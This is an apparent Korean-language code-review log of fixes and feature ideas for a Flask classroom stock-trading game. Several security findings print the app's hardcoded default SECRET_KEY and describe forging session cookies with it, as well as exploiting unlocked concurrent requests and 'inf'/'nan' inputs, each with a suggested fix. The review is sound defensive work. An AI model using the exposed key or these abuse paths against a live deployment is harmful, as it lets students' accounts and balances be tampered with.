- **학생 개인 거래 내역 CSV/엑셀 내보내기** (`app.py:1417-1488`, `export_rankings()`; `app.py:829-848`, `get_transactions()`): 현재 `export_rankings()`는 진행자만 호출 가능해 학생이 자신의 투자 일지를 기록할 방법이 없음. 참여자 본인의 거래 내역을 CSV로 내려받는 `GET /api/rooms/<rid>/export/my-transactions` 엔드포인트를 추가하면 학생이 자신의 투자 결정 내역을 저장해 수업 후 포트폴리오 보고서 작성에 활용 가능. 서버: `io.StringIO` + `csv.writer`로 `RoomTransaction.query.filter_by(room_id=rid, user_id=uid)` 결과를 CSV 직렬화(약 20줄). 클라이언트: 결과 화면 또는 포트폴리오 탭에 "📄 내 거래 내역 다운로드" 버튼 1개 추가.

- **진행자 O/X 의견 투표 — 패널티 없는 학급 토론 도구** (`app.py:1243-1342`, 퀴즈 시스템; `app.py:1245-1246`, `_quiz_settings`): 현재 O/X 퀴즈는 정답/패널티 시스템이라 "어떤 종목에 투자하겠나요?" 같은 의견 수집에는 부적합. `POST /api/rooms/<rid>/host/poll`로 투표 주제 설정, `POST /api/rooms/<rid>/poll/vote`에서 O/X 응답 수집, `GET /api/rooms/<rid>/poll/results`에서 O/X 비율 집계 반환. `_quiz_settings`·`_quiz_state`와 동일한 in-memory 패턴으로 `_poll_state: dict = {}` 추가(약 40줄). 진행자 설정 탭에 투표 시작 버튼 추가, 참여자 화면에 O/X 선택 팝업. 패널티 없이 학급 전체 의견을 실시간 가시화해 수업 토론 활성화.

### 제거/단순화할 것들

- **`lottery_draw()` 에서 `_lottery_lock` 미사용 → `get_lottery()` 자동 공개와 동시 실행 시 `_do_reveal()` 중복 호출 위험** (`app.py:1185-1207`, `lottery_draw()`; `app.py:1122-1147`, `get_lottery()`): `get_lottery()`는 타임아웃 후 `with _lottery_lock:` 내부에서 `_do_reveal(rid, cur)`를 호출하지만, 진행자 수동 추첨 엔드포인트 `lottery_draw()`는 `_lottery_lock` 없이 `cur['winning'] = nums`; `_do_reveal(rid, cur)` 를 직접 실행. 타임아웃 직전 진행자가 수동 추첨을 클릭하면 두 요청이 동시에 `_do_reveal()`에 진입해 같은 회차의 복권 당첨금이 이중 지급될 수 있음. 수정: `lottery_draw()`의 `cur['winning'] = nums`부터 `_do_reveal()` 호출까지를 `with _lottery_lock:`으로 감싸고, `_do_reveal()` 진입 직후 `if cur.get('state') == 'revealed': return` 가드를 추가(약 3줄).

- **참여자 게임 폴링의 `status=ended` 처리에서 룰렛 오버레이 미닫기** (`app.js:614-651`, `enterParticipantGame()` poll 내 `r.status === 'ended'` 분기): 이 분기에서 `closeQuiz()`(`app.js:617`), `lottery-overlay` 숨김(`app.js:618`), `hidePausedBanner()`·`hideEndingSoonBanner()`가 실행되지만 `roulette-overlay`를 닫는 코드가 없음. 진행자가 강제 종료하거나 타이머가 만료될 때 학생 화면에 룰렛 오버레이가 열려 있으면 결과 화면 전환 후에도 `position:fixed`의 오버레이가 화면을 덮어 학생이 게임 종료를 인지할 수 없음. `app.js:618` 다음 줄에 `document.getElementById('roulette-overlay').style.display = 'none';` 한 줄 추가로 즉시 해결 가능.

- **`host_adjust()` `delta` 에 `float('inf')`/`float('nan')` 검증 없음** (`app.py:594-603`, `host_adjust()`): `delta = float(d.get('delta', 0))` 에서 `"inf"` 또는 `"nan"` 문자열이 Python `float()`에 의해 `inf`·`nan`으로 변환됨. `m.cash = max(0, m.cash + float('inf'))` → `m.cash = inf`, `max(0, float('nan'))` → `nan`이 DB에 저장돼 이후 `member_total_value()`, `get_rankings()`, `export_rankings()` 등 모든 자산 계산이 깨짐. `import math`를 `app.py` 상단에 추가하고, `app.py:595` 파싱 직후 `if not math.isfinite(delta): return jsonify({'error': '잘못된 금액'}), 400` 한 줄로 방어. 동일 패턴이 `create_deposit()`(`app.py:887`)와 `lottery_start()`(`app.py:1087`)의 `float()` 변환에도 적용 필요.

- **`doSetIntervals()` 에서 `parseInt` 사용 — 부동소수점 주기 설정 불가** (`app.js:393-406`, `doSetIntervals()`): `const news = parseInt(document.getElementById('news-interval-input').value)` / `const price = parseInt(...)` 로 소수점을 잘라냄. 서버 `set_news_interval()`·`set_price_interval()`(`stock_service.py:197-213`)은 `max(5, min(300, float(s)))` 로 float를 허용하므로 7.5초나 12.5초 같은 정밀한 간격 설정이 가능하지만 클라이언트가 이를 버림. `parseInt` → `parseFloat` 로 교체하고 유효성 검사 조건 `!news || news < 5 || news > 300`는 그대로 유지하면 1줄 수정으로 소수점 입력 지원. 뉴스 간격을 더 세밀하게 조정하려는 교사에게 즉각 유용.

- **`app.py:13` 기본 `SECRET_KEY`가 소스코드에 하드코딩** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` — Render.com에 `SECRET_KEY` 환경변수가 설정되지 않으면 GitHub에 공개된 기본값이 Flask 세션 서명에 사용됨. 공격자가 이 키로 `session['user_id']`를 임의 값으로 위조한 쿠키를 생성해 다른 학생 계정으로 거래·자산 조정 가능. 개선안 1: 미설정 시 `if not os.environ.get('SECRET_KEY') and not debug: raise RuntimeError('SECRET_KEY를 설정하세요.')`. 개선안 2: `import secrets; app.secret_key = os.environ.get('SECRET_KEY') or secrets.token_hex(32)` — 매 재시작마다 세션 무효화되지만 기본값 노출 방지. Render.com 환경변수 설정이 장기적으로 올바른 해결책.

- **`create_room()` 에서 `starting_cash` 상한 없음 — 비현실적 자산으로 UI 오버플로** (`app.py:384-388`, `create_room()`): `starting_cash=max(100000, float(d.get('starting_cash', 10_000_000)))` 로 하한(10만원)은 있지만 상한이 없어 `9999999999999` 같은 값도 통과. `krw()` 포맷터(`app.js:48`)가 13자리 이상 숫자를 표시하면 종목 카드·랭킹 행·진행자 바 차트 레이아웃이 깨짐. `min()` 상한을 추가해 `max(100000, min(100_000_000_000, float(...)))` 로 1000억 제한. `duration_minutes`(`max(1, min(360, ...))`)와 `deposit_rate`(`max(0, min(50, ...))`)는 이미 양방향 클램핑하는데 `starting_cash`만 하한만 있는 불일치 해소.

## 2026-08-08

### 추가하면 좋을 기능

- **거래 수수료/세금 시뮬레이션 옵션** (`app.py:363-390`, `create_room()`; `app.py:747-767`, `trade()`): 실제 한국 주식 거래에는 증권사 수수료(약 0.015%) + 거래세(0.2%)가 발생하지만 현재 게임은 수수료가 없어 실제 투자 비용 개념을 가르치기 어려움. 방 생성 시 `commission_rate: float = 0` (0~1%) 컬럼을 `Room` 모델에 추가하고, `trade()` 의 SELL 분기 `app.py:761` 에 `fee = round(amount * room.commission_rate / 100)` + `member.cash += amount - fee` 로직 삽입. `create_room()` UI에 금리 입력 필드 옆에 "수수료율" 필드 1개 추가. 서버 컬럼 1개 + 비즈니스 로직 3줄 + UI 1줄. 수업 중 "왜 사자마자 팔면 손해냐?"를 수치로 직접 보여줄 수 있어 교육 효과 큼.

- **Page Visibility API를 이용한 스마트 폴링** (`app.js:613-650`, `enterParticipantGame()` pollInterval; `app.js:807-819`, `startNewsPolling()`): 학생이 스마트폰에서 카카오톡·브라우저 탭 전환 등 다른 앱으로 이동해도 10초 폴링이 백그라운드에서 계속 실행됨. `document.addEventListener('visibilitychange', () => { if (document.hidden) { stopPolling(); stopTimer(); } else { refreshRoomStatus(); enterParticipantGame 재폴링 시작; } })` 핸들러를 `enterParticipantGame()` 진입 시 한 번 등록(페이지 이탈 시 제거). 배터리·모바일 데이터 절약, Render free tier 불필요 요청 감소. JS 약 15줄, 서버 변경 없음.

- **뉴스 히스토리 탭** (`app.py:703-708`, `get_room_news()`; `stock_service.py:141-159`, `_generate_news()`): 폭탄 뉴스가 3초 팝업으로만 표시(`app.js:1172-1177`, `showBombNews()`)되다 사라져 놓친 학생이 다시 볼 방법이 없음. `StockService._news` 를 단일 딕셔너리에서 최근 20개 리스트 `_news_history: list = []` 로 변경하고, `GET /api/rooms/<rid>/news/history` 엔드포인트를 신규 추가. 참여자 하단 네비게이션의 `학습` 탭 내부 또는 별도 "📰 뉴스" 탭에 최신순으로 표시. `_generate_news()` 에서 `self._news_history.append(...)` + `self._news_history = self._news_history[-20:]` 2줄 추가, 서버 라우트 5줄, 클라이언트 UI 렌더 10줄. 수업 중 뉴스를 놓친 학생을 위한 복습 및 투자 결정 근거 추적에 유용.

- **방 설정 재사용 — 마지막 방 설정 자동 불러오기** (`app.js:121-140`, `doCreateRoom()`; `app.js:186-193`, `enterHostLobby()`): 교사가 매 수업마다 게임 시간·시작 자금·예금 금리를 처음부터 다시 입력해야 함. `doCreateRoom()` 성공 후 `localStorage.setItem('lastRoomSettings', JSON.stringify({duration_minutes, starting_cash, deposit_rate, name}))` 를 저장하고, `showScreen('screen-host-create')` 진입 시 localStorage 값이 있으면 각 `<input>` 필드에 자동으로 채워 넣는 초기화 함수 호출. 서버 변경 없음, JS 약 10줄. 반별로 방 이름만 바꾸면 되므로 교사 반복 입력 피로 감소.

- **결과 화면 참여자 개인 매매 통계 요약** (`app.py:829-848`, `get_transactions()`; `app.js:1575-1617`, `loadResults()`): 결과 화면에 최종 순위와 자산만 표시되고 개인 투자 행동 요약이 없어 수업 후 성찰 활동 지원이 부족함. `GET /api/rooms/<rid>/my-stats` 신규 엔드포인트에서 `RoomTransaction.query.filter_by(room_id=rid, user_id=uid)` 집계: 총 거래 횟수, BUY/SELL 비율, 가장 많이 거래한 종목, 최대 수익/손실 종목 반환(약 20줄). `results-my-stats` 카드(`app.js:1613`) 에 현재 gain_pct 외에 "총 거래 N회 · 가장 많이 거래한 종목 OO · 최대 수익 OO" 를 렌더링. 교사가 "스스로 어떤 전략을 썼는지 돌아봅시다" 활동을 진행하는 데 데이터 기반 지원 가능.

### 제거/단순화할 것들

- **`api.get()`/`api.post()` HTTP 오류 시 서버 에러 메시지 손실** (`app.js:30-44`, `api` 객체): `if (!r.ok) return {error: \`HTTP ${r.status}\`}` 패턴으로 서버가 반환한 실제 오류 메시지(예: `{'error': '잔액 부족 — 필요: 1,000,000원 / 보유: 500,000원'}`)를 버리고 단순 HTTP 상태코드만 반환. 결과적으로 `toast(data.error, 'error')` 로 표시되는 오류 토스트가 "HTTP 400"처럼 의미 없는 메시지를 보여줌. 수정: `async get(url) { const r = await fetch(url); const body = await r.json().catch(() => null); if (!r.ok) return {error: body?.error || \`HTTP ${r.status}\`}; return body; }` 로 두 함수 모두 3줄 수정. 서버 비즈니스 오류가 학생/교사에게 그대로 전달되어 UX 즉각 개선.

- **`Room.query.get_or_404(rid)` deprecated 패턴 37곳 — SQLAlchemy 2.0 경고 전면 발생** (`app.py` 전체, grep 기준 37개 사용처): `Query.get()`은 SQLAlchemy 2.0에서 deprecated이며 미래 버전에서 제거 예정. Render 배포 로그에 `LegacyAPIWarning`이 반복 출력됨. Flask-SQLAlchemy 3.x 에서 지원하는 `db.get_or_404(Room, rid)` 로 교체하면 의미·동작 동일. `sed -i 's/Room\.query\.get_or_404(\([^)]*\))/db.get_or_404(Room, \1)/g' app.py` 명령으로 Room 관련 30개를 일괄 치환 가능하며, `RoomMember.query.get_or_404`, `Deposit` 등 다른 모델도 같은 패턴 적용.

- **`member_total_value()` 를 루프 안에서 반복 호출 — `get_rankings()` 에서 N+1 쿼리 발생** (`app.py:107-118`, `member_total_value()`; `app.py:808-824`, `get_rankings()`; `app.py:543-562`, `host_members()`): `get_rankings()` 와 `host_members()` 가 `RoomMember.all()` N명 반복 중 각 uid마다 `RoomMember`·`RoomHolding`·`Deposit` 쿼리를 3회씩 실행 → 3N+1 round-trips. 30명 교실에서 91회 DB 쿼리. 개선: 루프 전에 `holdings_map = {h.user_id: h for h in RoomHolding.query.filter_by(room_id=rid).all()}` + `deps_map` 을 각 1회 로드 후 uid 키로 참조. 쿼리 수 3+1=4회로 고정되어 학생 수에 무관한 O(1) DB 접근. `app.py:107-118` 의 `member_total_value()` 에 `preloaded_holdings=None, preloaded_deps=None` 인자를 추가하면 기존 단일 호출 코드와 하위 호환 유지.

- **학번+이름을 단일 `username` 공백 구분으로 저장 — 이름에 공백 시 파싱 오류** (`app.py:333-342`, `enter()`; `app.js:73-76`, `doAuth()`; `app.py:1435-1437`, `export_rankings()`): `const u = \`${sid} ${name}\`` → `User.username = "20715 홍길동"`. `export_rankings()` 에서 `u.username.split(' ', 1)` 로 역파싱 시 `parts[0]`=학번, `parts[1]`=이름 가정. 이름이 "이 영희" 처럼 공백 포함 시 split 결과가 3개 이상이 되어 이름 컬럼이 "이"만 저장됨. 단기 수정: `app.py:1436` 의 `name = parts[1] if len(parts) > 1 else u.username` 을 `name = ' '.join(parts[1:]) if len(parts) > 1 else u.username` 으로 1줄 변경. 장기 수정: `User` 모델에 `student_id VARCHAR(20)`, `display_name VARCHAR(50)` 컬럼 분리. 현재 오류로 Excel 엑셀 결과물의 이름 컬럼이 손상될 수 있음.

- **뉴스 폴링 간격 8초 하드코딩 — 진행자 설정과 불일치** (`app.js:811`, `startNewsPolling()`; `app.py:630-646`, `host_news_interval()`): 진행자가 `POST /api/rooms/<rid>/host/news-interval`로 폭탄뉴스 간격을 5초로 설정해도 `startNewsPolling()` 의 `setInterval(..., 8000)` 은 변경되지 않아 최대 8초 지연이 생김. 참여자는 `/host/news-interval` API를 호출하지 않으므로 진행자 간격 설정이 사실상 참여자 화면에 반영되지 않음. `GET /api/rooms/<rid>/news` 응답에 `news_interval` 필드를 포함시키거나, `enterParticipantGame()` 시 `GET /api/rooms/<rid>/host/news-interval` 를 호출해(`app.js:385-389` `loadNewsInterval()` 재활용) `startNewsPolling(newsSeconds * 1000)` 으로 동적 설정. 서버 1줄 + 클라이언트 2줄.


## 2026-08-09

### 추가하면 좋을 기능

- **재접속 시 "자산 현황 복구" 토스트 알림 부재** (`app.js:173-185`, `resumeRoom()`; `app.js:592-651`, `enterParticipantGame()`): 학생이 브라우저를 새로고침하거나 세션이 복구될 때 `resumeRoom()` → `enterParticipantGame()`이 조용히 실행되어 학생이 재접속 성공 여부를 알 수 없음. `resumeRoom()` 내 `active`/`paused` 분기로 진입 직후 `refreshMyRank()` 결과를 받아 `toast(\`🔄 재접속됨 — 현재 총 자산 ${krw(totalValue)}, 순위 ${rank}위\`, 'info')` 를 표시하면 학생이 세션 복구를 즉각 확인 가능. `refreshMyRank()` (`app.js:739`)가 이미 총 자산과 순위를 받아오므로 콜백에 토스트 1줄 추가로 구현. 스마트폰에서 화면이 잠겼다 풀릴 때 세션이 끊기는 케이스에서 학생 혼란 방지에 직결.

- **QR 코드 이미지 PNG 다운로드 버튼** (`app.js:214-218`, `openGameQR()`; `index.html:672-683`, `modal-game-qr`): 진행자 QR 코드 모달(`modal-game-qr`)에 이미지 저장 버튼이 없어 교사가 카카오톡 단체방이나 학급 게시판에 QR 이미지를 공유하려면 화면 캡처에 의존해야 함. `QRCode` 라이브러리가 내부적으로 `<canvas>`를 생성하므로(`app.js:200-208`, `_makeQR()`), 생성된 canvas를 `canvas.toDataURL('image/png')`로 읽어 `<a href="..." download="game-qr.png">` 앵커를 동적으로 클릭하면 저장 가능. 모달 하단에 "📥 QR 이미지 저장" 버튼 1개 추가, 클라이언트 5줄 이내로 구현. 서버 변경 불필요.

- **게임 타이머 5분·1분 전 토스트 알림** (`app.js:759-779`, `startTimer()`): `startTimer()`의 `tick()` 함수가 이미 `rem <= 300` 시 'warn' 색상, `rem <= 60` 시 'danger' 색상으로 바꾸지만 소리나 토스트 같은 능동적 알림이 없어, 학생이 타이머를 보지 않고 있으면 종료를 놓침. `let _timerAlerted = new Set()` 를 선언하고 `tick()` 내 `rem`이 각각 300, 60에 처음 도달할 때 `_timerAlerted`로 중복 방지 후 `toast('⏰ 5분 남았습니다! 마무리 투자 전략을 세우세요.', 'info')` / `toast('⚠️ 1분 남았습니다! 룰렛이 곧 시작됩니다.', 'error')` 를 호출하면 됨. `enterParticipantGame()` 진입 시 `_timerAlerted = new Set()` 초기화 필요. 약 8줄 추가. 서버 변경 불필요.

- **게임 종료 결과 화면 — 참가자 개인 거래 통계 요약 부재** (`app.py:1474-1543`, `export_rankings()`; `app.js:1820-1900`, `loadResults()`; `index.html:648`, `results-my-stats`): 결과 화면의 `results-my-stats` 카드에 현재 "최종 자산, 수익률, 순위" 만 표시됨. `GET /api/rooms/<rid>/transactions` 가 이미 전체 거래 내역을 반환하므로, 결과 화면 렌더링 시 클라이언트에서 `RoomTransaction` 목록을 파싱해 "총 매수 N회 / 총 매도 M회 / 가장 많이 거래한 종목: 삼성전자 / 순수익 최고 종목: SK하이닉스 +12%" 요약을 추가하면 됨. 서버 변경 없이 `loadResults()` 내 `loadMoreTxn()` 호출로 전체 내역을 모으고 집계. 학생이 자신의 투자 패턴을 돌아보는 수업 마무리 활동에 직결.

- **참가자 게임 화면 — 폴링 실패 시 "연결 끊김" 오버레이 부재** (`app.js:616-652`, `enterParticipantGame()` 폴링 루프; `app.js:29-45`, `api.get()`): 10초 폴링(`S.pollInterval`)이 `api.get()` 실패 시 `{error: 'HTTP 502'}` 를 반환하거나 `fetch()` 자체가 네트워크 오류로 reject될 때 `if (r.status === 'ended')` 체크가 그냥 통과되며 UI가 조용히 멈춤. Render free tier의 cold start나 Wi-Fi 전환 상황에서 학생이 화면이 굳었는지 알 수 없음. 연속 2회 폴링 실패 시 `let _failCount = 0` 카운터를 증가시켜 상단에 `<div id="offline-banner">🔴 서버 연결 끊김 — 재연결 중...</div>` 배너를 표시하고 성공 시 숨기는 패턴을 추가하면 됨. 약 10줄, 서버 변경 불필요.

### 제거/단순화할 것들

- **`_compute_leaderboard()` N+1 쿼리로 학생 30명 기준 순위 계산 시 60+ DB 쿼리 실행** (`app.py:151-171`, `_compute_leaderboard()`; `app.py:138-149`, `member_total_value()`): `_compute_leaderboard()`는 `RoomMember` 목록을 순회하며 각 학생에 대해 `member_total_value(rid, uid)`를 호출하고, 이 함수는 내부에서 `RoomHolding.query.filter_by(room_id, user_id)` + `Deposit.query.filter_by(room_id, user_id)` = 학생당 2쿼리를 실행. 학생 30명 × 2쿼리 = 60쿼리가 10초 폴링마다 실행됨(`app.py:271-275`, `enterHostGame()` 폴링). `RoomHolding`과 `Deposit` 을 `room_id` 기준으로 한 번에 `filter_by(room_id=rid).all()` 로 일괄 조회한 뒤 Python dict 로 그룹핑하면 총 3쿼리(members, holdings, deposits)로 완료 가능. Render free tier PostgreSQL의 connection pool 절약 효과가 크며, 진행자 대시보드의 10초 순위 갱신 체감 속도가 개선됨.

- **`gen_code()` 10회 재시도 후 중복 코드 반환 가능 — `create_room()` 에서 `IntegrityError` 미처리** (`models.py:8-13`, `gen_code()`; `app.py:464-491`, `create_room()`): `gen_code()`는 10회 재시도 후에도 고유 코드를 찾지 못하면 `random.choices()`로 중복 가능성이 있는 코드를 그냥 반환. `Room.code`는 `unique=True`(`models.py:29`)이므로 `db.session.add(room)` 시점에 `IntegrityError`가 발생해 500 오류로 이어짐. 교실 규모에서 6자리 영숫자(36^6 ≈ 21억) 충돌 확률은 낮지만, `create_room()`에서 `try/except IntegrityError`로 `gen_code()`를 재호출하는 방어 로직 1블록을 추가하면 완전히 예방 가능. 또는 `gen_code()`에서 10회 초과 시 7자리로 늘리는 fallback도 단순한 대안.

- **`get_room()` 룰렛 자동 트리거 조건에 DB 레벨 락 없음 — 동시 요청 시 경합 가능** (`app.py:547-566`, `get_room()`): `room.rlt_triggered`를 조회해 `False`이면 `room.rlt_triggered = True; room.status = 'paused'`로 변경하는 로직이 `_rlt_lock` 밖에서 `Room` 객체를 통해 실행됨. 두 학생이 동시에 `/api/rooms/<rid>`를 폴링하면 두 요청이 모두 `not room.rlt_triggered` 조건을 통과해 룰렛을 두 번 트리거하거나, `rlt_triggered=True`로 두 번 커밋하는 레이스 컨디션이 발생 가능. `Room.query.filter_by(id=rid, rlt_triggered=False).update({'rlt_triggered': True, 'status': 'paused', 'paused_at': now_dt})` 로 변경 후 `db.session.commit()`을 원자적으로 실행하고 반환된 row 수(`updated`)가 0이면 이미 처리된 것으로 간주하는 패턴으로 교체하면 경합 조건 완전 해소. 현재 `_rlt_lock`은 `minigame_open()`/`minigame_close()`에서는 사용하지만 `get_room()`의 자동 트리거에는 적용되지 않음.

- **`app.py:19` `SECRET_KEY` 기본값이 소스코드에 공개 하드코딩** (`app.py:19`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` 로 기본값이 리포지터리에 공개되어 있음. 이 값이 실제 Render 배포에서 환경변수 미설정 시 그대로 사용되면 Flask 세션 쿠키(학번·이름·user_id 포함)를 외부에서 위조 가능. `os.environ.get('SECRET_KEY')` 로 기본값을 제거하고, 값이 없으면 `raise RuntimeError('SECRET_KEY 환경변수를 설정하세요.')` 또는 `secrets.token_hex(32)` 로 런타임 생성(재시작마다 세션 무효화되지만 교실 단기 게임에서는 허용 가능)을 선택. Render 배포 환경에서 `SECRET_KEY` 환경변수 설정 여부를 README에 명시하는 것도 필요.

- **`get_history()` 생성 차트 데이터가 실제 게임 주가와 무관하여 교육적 일관성 손상** (`stock_service.py:303-332`, `get_history()`): 종목 상세 모달의 캔들차트는 `get_history()`가 현재 price 기준으로 과거 30일치를 역방향 random walk로 생성. 학생이 "NVIDIA가 상승 중"을 보고 매수했는데 차트에는 최근 하락 추세가 그려질 수 있어 차트와 실제 거래가격이 불일치. 교육 목적으로는 게임 시작 이후의 실제 가격 변동 이력을 `StockService`가 ring-buffer(`collections.deque(maxlen=100)`)로 기록하고(`get_price()` 내 `self._price_history[sym].append((now, new_price))`), `get_history()`가 이 실측 이력을 반환하도록 전환하면 차트와 시세가 일치해 기술적 분석 교육에 활용 가능. `StockService.__init__()`에 `self._price_history: dict = {sym: deque(maxlen=100) for sym in STOCKS}` 1줄 추가로 시작.

## 2026-08-09 (2차)

### 추가하면 좋을 기능

- **진행자 화면 — 최근 5분 매수/매도 압력 실시간 위젯** (`app.py:643-649`, `host_members()`; `models.py:68-79`, `RoomTransaction`): 진행자가 수업 중 "지금 학생들이 어떤 종목을 사고 있나"를 실시간으로 파악할 수 없어 이벤트 타이밍 조율이 어렵. `GET /api/rooms/<rid>/host/trade-pressure` 엔드포인트를 추가해 `RoomTransaction.query.filter_by(room_id=rid).filter(RoomTransaction.timestamp >= datetime.utcnow() - timedelta(minutes=5)).all()` 를 symbol별로 집계(BUY 건수 vs SELL 건수)해 반환(서버 약 12줄). 클라이언트 'rank' 탭 상단에 "🔥 HOT 매수: 삼성전자 +8건 / NVIDIA +6건 · ❄️ HOT 매도: 카카오 -5건" chip 3개를 10초 폴링으로 갱신. 교사가 "지금 삼성전자에 몰리는 이유는?"을 발문하는 실시간 토론 트리거 가능.

- **포모도로 타이머를 참여자 게임 화면에서 접근 가능하도록 연동** (`static/pomodoro.html`; `app.js:599-614`, `enterParticipantGame()`; `index.html` 하단 nav): `/pomodoro` 경로의 포모도로 타이머 페이지가 이미 존재하지만(`app.py:423-425`, `pomodoro()`) 게임 화면 어디에서도 진입점이 없어 학생이 해당 기능을 알 수 없음. `index.html` 참여자 게임 화면의 `pg-education` 탭 최하단에 `<button class="btn btn-secondary" onclick="window.open('/pomodoro','_blank')">🍅 포모도로 타이머 열기</button>` 1줄 추가로 노출 가능. 서버 변경 불필요, 집중 투자 세션과 복습 타이머를 같은 수업에서 통합적으로 활용 가능.

- **진행자 커스텀 퀴즈 문제 추가 기능** (`app.py:1312-1397`, quiz 엔드포인트 전체; `education_data.py` 하드코딩 질문; `app.js:831-900`, `openQuiz()`): 현재 `QUIZ_QUESTIONS`가 `education_data.py`에 하드코딩되어 진행자가 오늘 수업 주제와 연계된 문제를 출제할 수 없음. `POST /api/rooms/<rid>/host/quiz-custom` 엔드포인트로 `{q: "질문", a: true/false, ex: "해설"}` 형태의 커스텀 문제를 `_quiz_custom: dict = {}` (room_id → list)에 추가하고, `get_quiz()`에서 `available = [q for q in QUIZ_QUESTIONS + _quiz_custom.get(rid, []) if q['id'] not in seen]` 으로 병합 출제. 진행자 설정 탭에 질문/정답(O·X)/해설 3개 입력 필드 + "추가" 버튼 UI(약 15줄). 서버 10줄 + 클라이언트 20줄. 교사가 수업 내용(예: "PER이 낮을수록 저평가 주식이다 — O/X") 직접 출제 가능.

- **게임 결과 단계적 공개 — 역순 카운트다운 모드** (`app.py:1441-1451`, `host_publish_results()`; `app.js:801-807`, `publishResults()`; `index.html:640-670`, `screen-results`): 현재 `results_published = True` 클릭 즉시 모든 학생에게 전체 순위가 공개되어 시상식 분위기를 연출하기 어려움. `host_publish_results()` 의 요청에 `reveal_mode: 'sequential'` 파라미터를 추가해 `results_published = True` 와 별개로 `results_reveal_rank: int` 컬럼(현재 공개된 최하위 순위, 0=미공개)을 Room 모델에 추가. 진행자가 "1위 공개" 버튼을 순서대로 누르면 `results_reveal_rank`가 감소(10 → 9 → … → 1)하며 학생 화면은 해당 순위까지만 표시. 서버 컬럼 1개 + 엔드포인트 수정 10줄 + 클라이언트 필터 렌더 10줄. "5위는… 이 학생입니다!" 발표 형식 수업 진행 가능.

- **참여자 화면 — 종목 모달에 평균 매수가 대비 손익분기 가격선 표시** (`app.js:1354-1425`, `openStockModal()` 및 `loadChart()`; `app.py:866-899`, `get_portfolio()`): 종목 차트 모달에 현재 가격 라인만 있고, 학생이 해당 종목을 보유 중일 때 "평균 매수가" 수평 기준선이 없어 "지금 팔면 수익인지 손실인지"를 직관적으로 파악하기 어려움. `openStockModal()` 내 `port.holdings` 에서 해당 symbol의 `avg_price`를 읽어, `S.stockChart` 생성 시 Chart.js `annotation` 플러그인 없이 `datasets[1]` 으로 `data: Array(n_bars).fill(avg_price)` 점선 라인을 추가. 색상: `avg_price > current_price` → 빨간 점선, 반대 → 초록 점선. `loadChart()` 내 2개 dataset 처리 코드 추가(약 10줄). 서버 변경 불필요. "내 평균 매수가가 여기고 현재가가 여기니까 아직 손해야"를 시각적으로 학습.

### 제거/단순화할 것들

- **`minigame_spin()` 에 `_get_member_lock` 미적용 — 동시 스핀 요청 시 현금 이중 차감 가능** (`app.py:1096-1142`, `minigame_spin()`): `trade()` 함수(`app.py:840-861`)는 `with _get_member_lock(rid, user.id): db.session.refresh(member)` 로 동시 매수/매도 경합을 방지하지만, 동일한 `m.cash` 차감+지급 로직을 가진 `minigame_spin()` 에는 멤버 락이 없음. 두 탭 또는 자동화된 요청으로 동시에 스핀 요청을 보내면 두 요청이 같은 cash 값을 읽고 각자 차감을 적용한 뒤 서로를 덮어써 한 번의 차감만 실제 반영되는 lost-update 발생 가능. `spins_used >= 3` 체크부터 `db.session.commit()` 까지를 `with _get_member_lock(rid, user.id):` 블록으로 감싸면 해결. `app.py:1106` 직후에 `with _get_member_lock(rid, user.id): db.session.refresh(m)` 삽입 및 기존 로직 들여쓰기 5줄 수정.

- **`models.py` 전체 — `datetime.utcnow` Python 3.12+ DeprecationWarning 미처리** (`models.py:21`, `models.py:37-38`, `models.py:53`, `models.py:79`, `models.py:92`): `default=datetime.utcnow` 는 함수 레퍼런스를 SQLAlchemy에 전달해 INSERT 시점에 호출하는 패턴이지만, Python 3.12에서 `datetime.utcnow()` 는 `DeprecationWarning: Use timezone-aware objects to represent datetimes in UTC`를 발생시키며 3.14에서 제거 예정. `from datetime import timezone` import 추가 후 `default=datetime.utcnow` 를 모두 `default=lambda: datetime.now(timezone.utc).replace(tzinfo=None)` (기존 naive UTC 유지, DB 컬럼 타입 변경 없음) 로 일괄 교체. 해당 파일 6개 컬럼 대상. `app.py` 내 직접 `datetime.utcnow()` 호출 25+ 곳도 동일하게 대응 필요.

- **`app.py:48-58` — 스키마 마이그레이션 중 모든 예외를 `except Exception` 으로 삼킴** (`app.py:48-58`, startup migration loop): 앱 시작 시 `ALTER TABLE ... ADD COLUMN` 4개를 순서대로 실행하며 `except Exception: db.session.rollback()` 으로 모든 예외를 무시함. 이 패턴은 "컬럼이 이미 존재한다" (`sqlite3.OperationalError: duplicate column name`)와 진짜 장애(디스크 풀, DB 연결 실패, 권한 오류)를 구분 없이 삼켜, 실제 마이그레이션 실패 시 앱이 정상 시작된 것처럼 보이다가 런타임에 `ColumnNotFound` 나 `ProgrammingError`가 발생. `from sqlalchemy.exc import OperationalError` 후 `except OperationalError: db.session.rollback()` 으로 좁히고, 나머지 예외는 `logger.error` 후 `raise` 로 재던져야 함. PostgreSQL의 경우 `psycopg2.errors.DuplicateColumn` 이 `OperationalError`가 아닌 `ProgrammingError`로 오므로, `from sqlalchemy.exc import OperationalError, ProgrammingError` 둘 다 잡는 것이 안전.

- **`app.js:49, 364, 377` — 지역변수 `pct` 가 전역 포매터 함수 `pct` 를 가림** (`app.js:49`, `const pct = n => ...` 전역 정의; `app.js:364`, `doForcePrice()` 내 `const pct = quickPct !== undefined ? ...`; `app.js:377`, `doMarketEvent()` 동일 패턴): `const pct = n => (n >= 0 ? '+' : '') + n.toFixed(2) + '%'` 으로 전역에 정의된 포매터 함수를 같은 이름의 지역변수로 덮어씌워, 해당 함수 내부에서 `pct(...)` 포매터 호출이 불가능해짐. 현재는 해당 함수 내에서 전역 `pct`를 포매터로 사용하지 않아 런타임 오류가 없지만, 향후 `doForcePrice()` 내에서 `msg.textContent = pct(result)` 형태의 코드를 추가하면 `TypeError: pct is not a function` 이 즉시 발생하는 시한폭탄. `doForcePrice()`와 `doMarketEvent()` 함수 시그니처를 `doForcePrice(quickPctVal)` 로 바꾸고 내부 지역변수를 `const pctValue = quickPctVal !== undefined ? quickPctVal : parseFloat(...)` 로 이름을 분리하면 해소.

